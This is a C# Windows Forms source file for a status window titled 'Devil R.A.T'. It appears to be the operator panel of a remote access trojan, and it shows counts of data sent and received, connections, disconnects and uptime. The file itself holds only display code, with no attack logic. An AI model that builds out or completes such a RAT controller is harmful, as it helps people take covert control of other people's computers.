using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace dvrat
{
    public partial class StatusForm : Form
    {
        public StatusForm()
        {
            InitializeComponent();
        }

        private void StatusForm_Load(object sender, EventArgs e)
        {
            this.Text = $"Devil R.A.T";
            title_label.Text = $"Devil R.A.T {this.ProductVersion}";
        }

        public void SetStatus(int AllRecv, int AllSend, int AllConnections, int AllDisconnect, string starts_time, string time_up)
        {
                new Thread(new ThreadStart(() =>
                {
                    try
                    {
                        Invoke(new MethodInvoker(() =>
                        {
                            try
                            {
                                recv_label.Text = $"Recv: {AllRecv.ToString("#,##0").Replace(',', '.')}";
                                send_label.Text = $"Send: {AllSend.ToString("#,##0").Replace(',', '.')}";
                                connect_label.Text = $"Connects: {AllConnections.ToString("#,##0").Replace(',', '.')}";
                                disconnect_label.Text = $"Disconnects: {AllDisconnect.ToString("#,##0").Replace(',', '.')}";
                                start_time_label.Text = $"Starts At: {starts_time}";
                                time_up_label.Text = $"Time Up: {time_up}";
                            }
                            catch (Exception ex)
                            {
                                throw (ex);
                            }
                        }));
                    }catch(Exception ex)
                    {
                        throw (ex);
                    }

                })).Start();
        }
    }
}
